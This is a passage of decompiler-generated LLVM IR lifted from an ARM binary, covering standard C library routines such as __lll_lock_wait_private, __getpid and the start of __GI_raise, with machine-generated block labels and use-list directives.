  %v0_15f30109 = phi i32 [ %v1_15f28.pre, %dec_label_pc_15f30.dec_label_pc_15f24_crit_edge ], [ %v2_15f18, %dec_label_pc_15f18 ]
  store i32 %v0_15f30109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f40, label %dec_label_pc_15f44, label %dec_label_pc_15f30.dec_label_pc_15f24_crit_edge

dec_label_pc_15f30.dec_label_pc_15f24_crit_edge:  ; preds = %dec_label_pc_15f30
  %v0_15f24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f28.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15f24 = inttoptr i32 %v0_15f24.pre to i32*
  %v2_15f24 = load i32, i32* %v1_15f24, align 4
  store i32 %v2_15f24, i32* %r3.global-to-local, align 4
  %v3_15f28 = icmp uge i32 %v2_15f24, %v1_15f28.pre
  store i1 %v3_15f28, i1* %cpsr_c.global-to-local, align 1
  %v9_15f28 = icmp eq i32 %v2_15f24, %v1_15f28.pre
  br i1 %v9_15f28, label %dec_label_pc_15f30, label %dec_label_pc_15f48

dec_label_pc_15f44:                               ; preds = %dec_label_pc_15f30
  %v0_15f44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f48

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f18, %dec_label_pc_15f30.dec_label_pc_15f24_crit_edge, %dec_label_pc_15f44
  %v0_15f50 = phi i32 [ %v0_15f44, %dec_label_pc_15f44 ], [ %v2_15f24100, %dec_label_pc_15f18 ], [ %v2_15f24, %dec_label_pc_15f30.dec_label_pc_15f24_crit_edge ]
  %v1_15f48 = phi i32 [ %v0_15f44, %dec_label_pc_15f44 ], [ %v2_15f18, %dec_label_pc_15f18 ], [ %v1_15f28.pre, %dec_label_pc_15f30.dec_label_pc_15f24_crit_edge ]
  %v3_15f48 = icmp uge i32 %v0_15f50, %v1_15f48
  store i1 %v3_15f48, i1* %cpsr_c.global-to-local, align 1
  %v9_15f48 = icmp eq i32 %v0_15f50, %v1_15f48
  br i1 %v9_15f48, label %dec_label_pc_15f50, label %dec_label_pc_15f48.dec_label_pc_15f18_crit_edge

dec_label_pc_15f48.dec_label_pc_15f18_crit_edge:  ; preds = %dec_label_pc_15f48
  %v0_15f18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15f18

dec_label_pc_15f50:                               ; preds = %dec_label_pc_15f48
  %v2_15f50 = icmp ne i32 %v1_15f48, 0
  store i1 %v2_15f50, i1* %cpsr_c.global-to-local, align 1
  %v7_15f54 = icmp slt i32 %v1_15f48, 2
  br i1 %v7_15f54, label %dec_label_pc_16000thread-pre-split, label %dec_label_pc_15f58

dec_label_pc_15f58:                               ; preds = %dec_label_pc_15f50
  %v0_15f58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15f58, i32* %r0.global-to-local, align 4
  %v0_15f5c = load i32, i32* @r1, align 4
  %v1_15f5c = add i32 %v0_15f5c, 129
  store i32 %v1_15f5c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16000thread-pre-split

dec_label_pc_15f74:                               ; preds = %dec_label_pc_16000thread-pre-split, %dec_label_pc_15ffc
  %v0_15f74 = phi i32 [ %v3_15ffc, %dec_label_pc_15ffc ], [ %v0_16000.pr, %dec_label_pc_16000thread-pre-split ]
  %v1_15f74 = inttoptr i32 %v0_15f74 to i32*
  %v2_15f74 = load i32, i32* %v1_15f74, align 4
  store i32 %v2_15f74, i32* %r3.global-to-local, align 4
  %v1_15f78 = add i32 %v2_15f74, 8
  %v2_15f78 = inttoptr i32 %v1_15f78 to i32*
  %v3_15f78 = load i32, i32* %v2_15f78, align 4
  store i32 %v3_15f78, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f7c = icmp eq i32 %v3_15f78, 0
  br i1 %v2_15f7c, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_15f74
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_15f74, %bb75
  %v2_15f84 = xor i1 %v2_15f7c, true
  call void @__pseudo_cond_branch(i1 %v2_15f84, i32 %v3_15f78)
  %v0_15f88 = load i32, i32* %r6.global-to-local, align 4
  %v1_15f88 = inttoptr i32 %v0_15f88 to i32*
  %v2_15f88 = load i32, i32* %v1_15f88, align 4
  store i32 %v2_15f88, i32* %r5.global-to-local, align 4
  %v1_15f8c = add i32 %v2_15f88, 20
  store i32 %v1_15f8c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f90

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15fc4.dec_label_pc_15f90_crit_edge, %bb76
  %v0_15f94 = phi i32 [ %v0_15f94.pre, %dec_label_pc_15fc4.dec_label_pc_15f90_crit_edge ], [ %v1_15f8c, %bb76 ]
  %v0_15f90 = phi i32 [ %v0_15f90.pre, %dec_label_pc_15fc4.dec_label_pc_15f90_crit_edge ], [ %v2_15f88, %bb76 ]
  %v1_15f90 = add i32 %v0_15f90, 20
  %v2_15f90 = inttoptr i32 %v1_15f90 to i32*
  %v3_15f90 = load i32, i32* %v2_15f90, align 4
  store i32 %v0_15f94, i32* %r2.global-to-local, align 4
  store i32 %v3_15f90, i32* %r4.global-to-local, align 4
  %v1_15f9c = add i32 %v3_15f90, -1
  store i32 %v1_15f9c, i32* @r1, align 4
  %v1_15fa087 = inttoptr i32 %v0_15f94 to i32*
  %v2_15fa088 = load i32, i32* %v1_15fa087, align 4
  store i32 %v2_15fa088, i32* %r3.global-to-local, align 4
  %v3_15fa490 = icmp uge i32 %v2_15fa088, %v3_15f90
  store i1 %v3_15fa490, i1* %cpsr_c.global-to-local, align 1
  %v9_15fa496 = icmp eq i32 %v2_15fa088, %v3_15f90
  br i1 %v9_15fa496, label %dec_label_pc_15fac, label %dec_label_pc_15fc4

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15f90, %dec_label_pc_15fac.dec_label_pc_15fa0_crit_edge
  %v0_15fac97 = phi i32 [ %v1_15fa4.pre, %dec_label_pc_15fac.dec_label_pc_15fa0_crit_edge ], [ %v3_15f90, %dec_label_pc_15f90 ]
  store i32 %v0_15fac97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fbc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fbc, label %dec_label_pc_15fc0, label %dec_label_pc_15fac.dec_label_pc_15fa0_crit_edge

dec_label_pc_15fac.dec_label_pc_15fa0_crit_edge:  ; preds = %dec_label_pc_15fac
  %v0_15fa0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15fa4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15fa0 = inttoptr i32 %v0_15fa0.pre to i32*
  %v2_15fa0 = load i32, i32* %v1_15fa0, align 4
  store i32 %v2_15fa0, i32* %r3.global-to-local, align 4
  %v3_15fa4 = icmp uge i32 %v2_15fa0, %v1_15fa4.pre
  store i1 %v3_15fa4, i1* %cpsr_c.global-to-local, align 1
  %v9_15fa4 = icmp eq i32 %v2_15fa0, %v1_15fa4.pre
  br i1 %v9_15fa4, label %dec_label_pc_15fac, label %dec_label_pc_15fc4

dec_label_pc_15fc0:                               ; preds = %dec_label_pc_15fac
  %v0_15fc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15fc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fc4

dec_label_pc_15fc4:                               ; preds = %dec_label_pc_15f90, %dec_label_pc_15fac.dec_label_pc_15fa0_crit_edge, %dec_label_pc_15fc0
  %v0_15fd0 = phi i32 [ %v0_15fc0, %dec_label_pc_15fc0 ], [ %v2_15fa088, %dec_label_pc_15f90 ], [ %v2_15fa0, %dec_label_pc_15fac.dec_label_pc_15fa0_crit_edge ]
  %v1_15fc4 = phi i32 [ %v0_15fc0, %dec_label_pc_15fc0 ], [ %v3_15f90, %dec_label_pc_15f90 ], [ %v1_15fa4.pre, %dec_label_pc_15fac.dec_label_pc_15fa0_crit_edge ]
  %v3_15fc4 = icmp uge i32 %v0_15fd0, %v1_15fc4
  store i1 %v3_15fc4, i1* %cpsr_c.global-to-local, align 1
  %v9_15fc4 = icmp eq i32 %v0_15fd0, %v1_15fc4
  store i32 %v0_15fd0, i32* %r2.global-to-local, align 4
  br i1 %v9_15fc4, label %dec_label_pc_15fd0, label %dec_label_pc_15fc4.dec_label_pc_15f90_crit_edge

dec_label_pc_15fc4.dec_label_pc_15f90_crit_edge:  ; preds = %dec_label_pc_15fc4
  %v0_15f90.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15f94.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f90

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15fc4
  %v2_15fd0 = icmp ne i32 %v1_15fc4, 0
  store i1 %v2_15fd0, i1* %cpsr_c.global-to-local, align 1
  %v7_15fd0 = icmp eq i32 %v1_15fc4, 1
  %v0_15fd8 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_15fd0, label %dec_label_pc_15fd8, label %dec_label_pc_15ffc

dec_label_pc_15fd8:                               ; preds = %dec_label_pc_15fd0
  %v1_15fd8 = inttoptr i32 %v0_15fd8 to i32*
  %v2_15fd8 = load i32, i32* %v1_15fd8, align 4
  store i32 %v2_15fd8, i32* @r1, align 4
  %v1_15fdc = add i32 %v2_15fd8, 24
  %v2_15fdc = inttoptr i32 %v1_15fdc to i32*
  %v3_15fdc = load i32, i32* %v2_15fdc, align 4
  store i32 %v3_15fdc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fe0 = icmp eq i32 %v3_15fdc, 0
  br i1 %v2_15fe0, label %dec_label_pc_15ffc, label %dec_label_pc_15fe8

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fd8
  %v1_15fe8 = add i32 %v2_15fd8, 20
  %v2_15fe8 = inttoptr i32 %v1_15fe8 to i32*
  %v3_15fe8 = load i32, i32* %v2_15fe8, align 4
  store i32 %v3_15fe8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15fd0, %dec_label_pc_15fe8, %dec_label_pc_15fd8
  %v1_15ffc = add i32 %v0_15fd8, 4
  %v2_15ffc = inttoptr i32 %v1_15ffc to i32*
  %v3_15ffc = load i32, i32* %v2_15ffc, align 4
  store i32 %v3_15ffc, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16000 = icmp eq i32 %v3_15ffc, 0
  br i1 %v2_16000, label %dec_label_pc_16008, label %dec_label_pc_15f74

dec_label_pc_16000thread-pre-split:               ; preds = %dec_label_pc_15f58, %dec_label_pc_15f50, %dec_label_pc_15ef0
  %v0_16000.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1600011 = icmp eq i32 %v0_16000.pr, 0
  br i1 %v2_1600011, label %dec_label_pc_16008, label %dec_label_pc_15f74

dec_label_pc_16008:                               ; preds = %dec_label_pc_15ffc, %dec_label_pc_16000thread-pre-split
  %v0_16008.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16008.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_16008.pre

; uselistorder directives
  uselistorder i32 %v0_16000.pr, { 1, 0 }
  uselistorder i32 %v3_15ffc, { 1, 2, 0 }
  uselistorder i32 %v1_15fc4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15fc0, { 1, 0, 2 }
  uselistorder i32 %v1_15fa4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15f44, { 1, 0, 2 }
  uselistorder i32 %v1_15f28.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15f18, { 1, 0 }
  uselistorder i32 %v0_15dbc, { 1, 0, 2 }
  uselistorder i32 %v1_15da0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15d78, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15d50, { 1, 0, 2 }
  uselistorder i32 %v1_15d34.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_15cfc, { 1, 0, 2 }
  uselistorder i32 %v0_15cdc, { 1, 0, 2 }
  uselistorder i32 %v1_15cc0.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 6, 0, 4, 5, 7, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 1, 10, 11, 12, 13, 15, 14, 2, 16, 17, 18, 19, 20, 21, 22, 24, 23, 3, 25, 26, 27, 29, 28, 4, 30, 31, 33, 32, 0, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 13, 7, 8, 9, 11, 10, 3, 12, 14, 15, 17, 16, 4, 18, 19, 21, 20, 5, 22, 23, 25, 24, 6, 26, 27, 28, 30, 29, 0, 32, 31, 2 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_16008, { 1, 0 }
  uselistorder label %dec_label_pc_15ffc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15fc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fac, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_15f48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f30, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15dc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15da8, { 1, 0 }
  uselistorder label %dec_label_pc_15d54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d3c, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_15ce0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15cc8, { 1, 0 }
  uselistorder label %dec_label_pc_15d64.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15c94, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16040 = load i32, i32* @r4, align 4
  store i32 %v3_16040, i32* %stack_var_-16, align 4
  %v0_16044 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16044, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16048

dec_label_pc_16048:                               ; preds = %dec_label_pc_160c8.dec_label_pc_16048_crit_edge, %entry
  %v0_1604c = phi i32 [ %v0_1604c.pre, %dec_label_pc_160c8.dec_label_pc_16048_crit_edge ], [ %v0_16044, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1604c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1605417 = inttoptr i32 %v0_1604c to i32*
  %v2_1605418 = load i32, i32* %v1_1605417, align 4
  %v3_1605820 = icmp ne i32 %v2_1605418, 0
  store i1 %v3_1605820, i1* %cpsr_c.global-to-local, align 1
  %v9_1605826 = icmp eq i32 %v2_1605418, 1
  br i1 %v9_1605826, label %dec_label_pc_16060, label %dec_label_pc_16078

dec_label_pc_16060:                               ; preds = %dec_label_pc_16048, %dec_label_pc_16060.dec_label_pc_16054_crit_edge
  %v0_1606027 = phi i32 [ %v1_16058.pre, %dec_label_pc_16060.dec_label_pc_16054_crit_edge ], [ 1, %dec_label_pc_16048 ]
  store i32 %v0_1606027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16070 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16070, label %dec_label_pc_16074, label %dec_label_pc_16060.dec_label_pc_16054_crit_edge

dec_label_pc_16060.dec_label_pc_16054_crit_edge:  ; preds = %dec_label_pc_16060
  %v0_16054.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16058.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16054 = inttoptr i32 %v0_16054.pre to i32*
  %v2_16054 = load i32, i32* %v1_16054, align 4
  %v3_16058 = icmp uge i32 %v2_16054, %v1_16058.pre
  store i1 %v3_16058, i1* %cpsr_c.global-to-local, align 1
  %v9_16058 = icmp eq i32 %v2_16054, %v1_16058.pre
  br i1 %v9_16058, label %dec_label_pc_16060, label %dec_label_pc_16078

dec_label_pc_16074:                               ; preds = %dec_label_pc_16060
  %v0_16074 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %dec_label_pc_16048, %dec_label_pc_16060.dec_label_pc_16054_crit_edge, %dec_label_pc_16074
  %v0_16078 = phi i32 [ %v0_16074, %dec_label_pc_16074 ], [ %v2_1605418, %dec_label_pc_16048 ], [ %v2_16054, %dec_label_pc_16060.dec_label_pc_16054_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16078 = icmp eq i32 %v0_16078, 0
  %v0_1609c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_16078, label %dec_label_pc_16098, label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %dec_label_pc_16078
  store i32 %v0_1609c.pre, i32* %r0.global-to-local, align 4
  %v0_16084 = load i32, i32* %r1.global-to-local, align 4
  %v1_16084 = add i32 %v0_16084, 126
  store i32 %v1_16084, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16098

dec_label_pc_16098:                               ; preds = %dec_label_pc_16078, %dec_label_pc_16080
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1609c.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_160a428 = inttoptr i32 %v0_1609c.pre to i32*
  %v2_160a429 = load i32, i32* %v1_160a428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_160a836 = icmp eq i32 %v2_160a429, 0
  br i1 %v9_160a836, label %dec_label_pc_160b0, label %dec_label_pc_160c8

dec_label_pc_160b0:                               ; preds = %dec_label_pc_16098, %dec_label_pc_160b0.dec_label_pc_160a4_crit_edge
  %v0_160b037 = phi i32 [ %v1_160a8.pre, %dec_label_pc_160b0.dec_label_pc_160a4_crit_edge ], [ 0, %dec_label_pc_16098 ]
  store i32 %v0_160b037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160c0, label %dec_label_pc_160c4, label %dec_label_pc_160b0.dec_label_pc_160a4_crit_edge

dec_label_pc_160b0.dec_label_pc_160a4_crit_edge:  ; preds = %dec_label_pc_160b0
  %v0_160a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160a8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_160a4 = inttoptr i32 %v0_160a4.pre to i32*
  %v2_160a4 = load i32, i32* %v1_160a4, align 4
  %v3_160a8 = icmp uge i32 %v2_160a4, %v1_160a8.pre
  store i1 %v3_160a8, i1* %cpsr_c.global-to-local, align 1
  %v9_160a8 = icmp eq i32 %v2_160a4, %v1_160a8.pre
  br i1 %v9_160a8, label %dec_label_pc_160b0, label %dec_label_pc_160c8

dec_label_pc_160c4:                               ; preds = %dec_label_pc_160b0
  %v0_160c4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_16098, %dec_label_pc_160b0.dec_label_pc_160a4_crit_edge, %dec_label_pc_160c4
  %v0_160c8 = phi i32 [ %v0_160c4, %dec_label_pc_160c4 ], [ %v2_160a429, %dec_label_pc_16098 ], [ %v2_160a4, %dec_label_pc_160b0.dec_label_pc_160a4_crit_edge ]
  %v1_160c8 = phi i32 [ %v0_160c4, %dec_label_pc_160c4 ], [ 0, %dec_label_pc_16098 ], [ %v1_160a8.pre, %dec_label_pc_160b0.dec_label_pc_160a4_crit_edge ]
  %v3_160c8 = icmp uge i32 %v0_160c8, %v1_160c8
  store i1 %v3_160c8, i1* %cpsr_c.global-to-local, align 1
  %v9_160c8 = icmp eq i32 %v0_160c8, %v1_160c8
  br i1 %v9_160c8, label %dec_label_pc_160d0, label %dec_label_pc_160c8.dec_label_pc_16048_crit_edge

dec_label_pc_160c8.dec_label_pc_16048_crit_edge:  ; preds = %dec_label_pc_160c8
  %v0_1604c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16048

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160c8
  %v2_160d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_160d0, i32* %r4.global-to-local, align 4
  %v1_160d4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_160d4

; uselistorder directives
  uselistorder i32 %v0_160c4, { 1, 0 }
  uselistorder i32 %v1_160a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16058.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1605418, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 6, 7, 3, 5, 4, 0 }
  uselistorder i32 126, { 8, 7, 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_160c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160b0, { 1, 0 }
  uselistorder label %dec_label_pc_16098, { 1, 0 }
  uselistorder label %dec_label_pc_16078, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16060, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_160d8 = load i32, i32* @r7, align 4
  store i32 %v3_160d8, i32* %stack_var_-8, align 4
  %v0_160dc = call i32 @__aeabi_read_tp()
  store i32 %v0_160dc, i32* %r0.global-to-local, align 4
  %v1_160e0 = add i32 %v0_160dc, -1060
  %v2_160e0 = inttoptr i32 %v1_160e0 to i32*
  %v3_160e0 = load i32, i32* %v2_160e0, align 4
  %tmp7 = icmp slt i32 %v3_160e0, 1
  br i1 %tmp7, label %dec_label_pc_160f0, label %dec_label_pc_16114

dec_label_pc_160f0:                               ; preds = %entry
  %v2_160e4 = icmp eq i32 %v3_160e0, 0
  br i1 %v2_160e4, label %dec_label_pc_160f4, label %dec_label_pc_16100

dec_label_pc_160f4:                               ; preds = %dec_label_pc_160f0
  %v1_160f4 = add i32 %v0_160dc, -1064
  %v2_160f4 = inttoptr i32 %v1_160f4 to i32*
  %v3_160f4 = load i32, i32* %v2_160f4, align 4
  store i32 %v3_160f4, i32* %r0.global-to-local, align 4
  %v2_160f8 = icmp eq i32 %v3_160f4, 0
  br i1 %v2_160f8, label %bb, label %bb8

dec_label_pc_16100:                               ; preds = %dec_label_pc_160f0
  br label %bb8

bb:                                               ; preds = %dec_label_pc_160f4
  store i32 0, i32* %v2_160f4, align 4
  %v0_16110.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_16100, %dec_label_pc_160f4, %bb
  %v0_16110 = phi i32 [ %v3_160f4, %dec_label_pc_160f4 ], [ %v0_160dc, %dec_label_pc_16100 ], [ %v0_16110.pre, %bb ]
  br label %dec_label_pc_16114

dec_label_pc_16114:                               ; preds = %entry, %bb8
  %v0_16114 = phi i32 [ %v3_160e0, %entry ], [ %v0_16110, %bb8 ]
  store i32 %v0_16114, i32* %r0.global-to-local, align 4
  %v2_16118 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16118, i32* @r7, align 4
  ret i32 %v0_16114

; uselistorder directives
  uselistorder i32 %v0_16114, { 1, 0 }
  uselistorder i32 %v3_160e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16114, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16120 = load i32, i32* @r4, align 4
  store i32 %v3_16120, i32* %stack_var_-20, align 4
  %v0_16128 = call i32 @__aeabi_read_tp()
  store i32 %v0_16128, i32* %r0.global-to-local, align 4
  %v1_1612c = add i32 %v0_16128, -1064
  %v2_1612c = inttoptr i32 %v1_1612c to i32*
  %v3_1612c = load i32, i32* %v2_1612c, align 4
  store i32 %v3_1612c, i32* %r4.global-to-local, align 4
  %v2_16130 = icmp eq i32 %v3_1612c, 0
  %v1_16138 = add i32 %v0_16128, -1060
  %v2_16138 = inttoptr i32 %v1_16138 to i32*
  %v3_16138 = load i32, i32* %v2_16138, align 4
  store i32 %v3_16138, i32* %r0.global-to-local, align 4
  br i1 %v2_16130, label %dec_label_pc_16140, label %dec_label_pc_16154

dec_label_pc_16140:                               ; preds = %entry
  store i32 %v3_16138, i32* %r4.global-to-local, align 4
  store i32 %v3_16138, i32* %v2_1612c, align 4
  %v0_1617c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_16154:                               ; preds = %entry
  %v5_16158 = icmp sgt i32 %v3_16138, 0
  br i1 %v5_16158, label %bb28, label %dec_label_pc_1615c

dec_label_pc_1615c:                               ; preds = %dec_label_pc_16154
  %tmp = bitcast i32 %v3_16138 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_1615c = bitcast float %tmp30 to i32
  %v2_16160 = icmp eq i32 %v1_1615c, 0
  br i1 %v2_16160, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1615c
  store i32 %v3_1612c, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_1615c
  %v2_16168 = sub i32 0, %v3_16138
  store i32 %v2_16168, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_16154, %dec_label_pc_16140, %.thread
  %v0_16180 = phi i32 [ %v3_16138, %dec_label_pc_16154 ], [ %v0_1617c.pre, %dec_label_pc_16140 ], [ %v3_1612c, %bb ], [ %v2_16168, %.thread ]
  store i32 %v0_16180, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_16180, -4095
  br i1 %tmp31, label %dec_label_pc_161a4, label %dec_label_pc_1618c

dec_label_pc_1618c:                               ; preds = %bb28
  %v0_16190 = call i32 @__aeabi_read_tp()
  %v3_16194 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16194 = sext i16 %v3_16194 to i32
  %v0_16198 = load i32, i32* %r2.global-to-local, align 4
  %v1_16198 = sub i32 0, %v0_16198
  store i32 %v1_16198, i32* %r2.global-to-local, align 4
  %v3_1619c = add i32 %v4_16194, %v0_16190
  %v4_1619c = inttoptr i32 %v3_1619c to i32*
  store i32 %v1_16198, i32* %v4_1619c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161a4

dec_label_pc_161a4:                               ; preds = %bb28, %dec_label_pc_1618c
  %v0_161a8 = phi i32 [ %v0_16180, %bb28 ], [ -1, %dec_label_pc_1618c ]
  %v3_161a4 = icmp eq i32 %v0_161a8, -1
  store i32 %v0_161a8, i32* %r5.global-to-local, align 4
  br i1 %v3_161a4, label %dec_label_pc_161b0, label %dec_label_pc_161f8

dec_label_pc_161b0:                               ; preds = %dec_label_pc_161a4
  %v0_161b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_161b4, i32* %r0.global-to-local, align 4
  %v3_161b8 = load i16, i16* @global_var_244d0.762, align 2
  %v4_161b8 = sext i16 %v3_161b8 to i32
  %v2_161bc = add i32 %v4_161b8, %v0_161b4
  %v3_161bc = inttoptr i32 %v2_161bc to i32*
  %v4_161bc = load i32, i32* %v3_161bc, align 4
  %v7_161c0 = icmp eq i32 %v4_161bc, 38
  br i1 %v7_161c0, label %dec_label_pc_161cc, label %dec_label_pc_161b0.dec_label_pc_161f8_crit_edge

dec_label_pc_161b0.dec_label_pc_161f8_crit_edge:  ; preds = %dec_label_pc_161b0
  %v0_161f8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161f8

